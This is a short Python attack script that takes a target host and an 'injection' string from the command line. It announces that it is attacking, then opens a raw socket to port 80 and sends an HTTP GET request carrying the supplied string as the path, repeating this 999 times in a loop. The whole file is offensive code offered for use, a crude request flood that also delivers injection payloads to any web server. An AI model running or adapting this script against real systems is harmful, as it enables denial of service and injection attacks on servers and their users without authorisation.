import socket
import sys
 
print("][ Attacking " + sys.argv[1] + " ... ][")
print("injecting " + sys.argv[2])
print("the above line prints attacking addresses..ig")
 
def attack():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((sys.argv[1], 80))
    print(">> GET /" + sys.argv[2] + " HTTP/1.1")
    s.send(("GET /" + sys.argv[2] + " HTTP/1.1\r\n").encode())
    s.send(("Host: " + sys.argv[1] + "\r\n\r\n").encode())
    s.close()
 
for i in range(1, 1000):
    attack()